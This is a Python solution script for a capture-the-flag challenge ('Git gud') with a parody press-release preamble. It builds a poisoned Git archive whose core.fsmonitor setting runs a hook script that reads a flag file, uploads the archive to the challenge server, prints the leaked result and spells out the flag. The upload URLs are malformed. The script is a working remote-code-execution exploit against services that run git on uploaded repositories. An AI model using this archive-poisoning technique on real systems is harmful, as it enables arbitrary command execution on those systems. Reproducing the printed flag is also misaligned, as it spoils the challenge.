import subprocess, os, requests

# Git gud
# Difficulty: Medium-Hard

# Brunnerne Inc. (NASDAQ: BRNR), the global leader in synergistic developer enablement solutions, today
# announced the launch of Git gud, a first-of-its-kind, cloud-native, AI-adjacent repository
# intelligence platform that reimagines the way teams operationalize their version control data streams

# Git gud empowers organizations to seamlessly onboard their Git repositories into Brunnerne's
# proprietary, enterprise-grade analytics pipeline, unlocking actionable, data-driven insights across
# the entire commit lifecycle. By leveraging a best-in-class ingestion framework, Git gud transforms raw commit
# metadata into holistic, 360-degree visibility into developer productivity metrics all while maintaining a
# frictionless, zero-config user experience

comments = '''
  Utility script that crafts a malicious Git repository archive (.tar). Exploits the "core.fsmonitor" configuration
  hook by embedding an executable payload in ".git/hooks/fsmonitor" to execute arbitrary commands upon Git lifecycle events
'''

tags = '''
  #git #fsmonitor #git-hooks #remote-code-execution #archive-poisoning
'''

class Py_testing:
  def main():
    # Create directory and change working directory path
    subprocess.run('mkdir repository', shell=True)
    os.chdir('repository')

    subprocess.run('git init', shell=True)
    subprocess.run('rm -rf .git/hooks/*', shell=True)

    # Payload script that reads flag and creates a file named after it
    script_content = """#!/bin/sh
      flag="$(cat /app/flag.txt)"
      touch "$flag"
    """

    # Write hook payload to fsmonitor hook file
    with open('.git/hooks/fsmonitor', 'w') as fsmonitor:
      fsmonitor.write(script_content)

    # Make hook executable (CRITICAL: Git hooks require execution permissions)
    os.chmod('.git/hooks/fsmonitor', 0o755)

    # This will be activated at executing "git add ." & "git log"
    # The vulnerable code is this log_out, err = run_git_command(["log", "--numstat", "--date=iso-strict", "--format=commit%x1f%H%x1f%ad%x1f%an%x1f%ae"], repo_dir)
    subprocess.run('git config core.fsmonitor .git/hooks/fsmonitor', shell=True)

    subprocess.run('touch flag_to_test', shell=True)
    subprocess.run('git add . && git commit -m "Add: Monitor"', shell=True)
    subprocess.run('tar -czvf exploit.tar .git', shell=True)

  def analyze_file():
    UPLOAD_URL = 'http://https://git-gud-e45eb0897704b2c6-global.challs.brunnerne.xyz/upload'
    STATS_URL = 'http://https://git-gud-e45eb0897704b2c6-global.challs.brunnerne.xyz/stats'

    with open('exploit.tar', 'rb') as f:
      files = {'file': ('exploit.tar', f, 'application/x-tar')}
      response = requests.post(UPLOAD_URL, files=files).json()

    GIT_ID = response['id']

    response = requests.get(f'{STATS_URL}/{GIT_ID}').json()

    # Try to change the number, 1, 2 or 3 to see the flag
    print(response['status'][3])

    # Flag => brunner{1_gu355_u_g0t_g00d_huh?}

if __name__ == '__main__':
  Py_testing.main()
  Py_testing.analyze_file()
